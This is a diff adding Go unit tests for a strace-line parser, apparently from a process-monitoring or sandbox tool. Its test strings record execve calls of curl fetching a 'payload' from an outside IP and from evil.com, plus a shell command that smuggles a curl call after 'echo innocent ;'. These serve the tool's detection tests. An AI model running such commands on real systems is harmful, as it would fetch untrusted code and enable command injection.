@@ -105,6 +105,35 @@ func TestParseStraceLine_Irrelevant(t *testing.T) {
 	}
 }
 
+func TestParseStraceLine_ExecveFailedENOENT(t *testing.T) {
+	// Failed execve (ENOENT) should be skipped — it's a normal PATH lookup.
+	lines := []string{
+		`[pid    33] execve("/usr/local/bin/curl", ["curl", "http://198.51.100.1/payload"], 0x7fff29c11690 /* 8 vars */) = -1 ENOENT (No such file or directory)`,
+		`[pid    30] execve("/usr/local/bin/lsb_release", ["lsb_release", "-a"], 0x7ffdd868e370 /* 7 vars */) = -1 ENOENT (No such file or directory)`,
+		`[pid    19] execve("/usr/sbin/curl", ["curl", "http://evil.com"], 0x7fff /* 8 vars */) = -1 EACCES (Permission denied)`,
+	}
+
+	for _, line := range lines {
+		if _, ok := parseStraceLine(line); ok {
+			t.Errorf("expected failed execve to be skipped: %s", line)
+		}
+	}
+}
+
+func TestParseStraceLine_ExecveSuccess(t *testing.T) {
+	// Successful execve (= 0) should be parsed.
+	line := `[pid    34] execve("/bin/sh", ["sh", "-c", "--", "echo innocent ; curl http://198."], 0x7fff29c11690 /* 8 vars */) = 0`
+
+	evt, ok := parseStraceLine(line)
+	if !ok {
+		t.Fatal("expected successful execve to be parsed")
+	}
+
+	if evt.Comm != "/bin/sh" {
+		t.Errorf("expected comm /bin/sh, got %s", evt.Comm)
+	}
+}
+
 func TestParseStraceLine_NoPID(t *testing.T) {
 	line := `connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`
 
